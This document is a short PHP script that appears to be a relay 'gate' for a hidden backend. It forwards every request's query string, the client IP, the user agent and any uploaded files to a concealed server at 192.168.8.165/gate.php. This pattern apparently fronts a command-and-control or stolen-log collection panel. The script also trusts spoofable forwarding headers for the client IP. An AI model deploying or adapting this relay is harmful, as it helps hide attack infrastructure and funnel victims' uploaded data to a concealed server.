<?php
function get_ip_address()
{
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                {
                    return $ip;}}}}}




$_SERVER['REMOTE_ADDR'] = get_ip_address();

//http://localhost/uadmin/gates/log.php?callback=fun&link=123
header('Content-Type: application/json');
$ip        = $_SERVER['REMOTE_ADDR'];
$ua        = $_SERVER['HTTP_USER_AGENT'];
$real_home="http://192.168.8.165//gate.php";
$query     = $_SERVER['QUERY_STRING'];



if (isset($_GET['callback'])) {

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $real_home . "?" . $query . "&ip=" . $ip);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    //curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);

    if (!empty($_FILES)) {


        $data = array();
        foreach ($_FILES as $input_name => $file_object) {
            $tmpfile           = $file_object['tmp_name'];
            $filename          = $file_object['name'];
            $data[$input_name] = curl_file_create($tmpfile, $file_object['type'], $filename);
        }
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    }

    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("REMOTE_ADDR: $ip", "X_FORWARDED_FOR: $ip"));
    curl_exec($ch);

}
